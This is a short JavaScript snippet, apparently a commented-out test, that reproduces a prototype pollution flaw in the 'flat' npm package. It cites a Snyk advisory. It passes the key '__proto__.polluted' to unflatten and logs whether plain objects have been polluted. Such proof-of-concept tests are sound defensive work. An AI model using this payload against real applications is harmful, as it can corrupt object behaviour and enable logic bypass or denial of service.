// //https://snyk.io/vuln/SNYK-JS-FLAT-596927
// test("prototype pollution in flat", () => {
  var unflatten = require("flat").unflatten;

console.log({}.polluted);

  unflatten({
    "__proto__.polluted": "yes",
  });

console.log({}.polluted);
// });
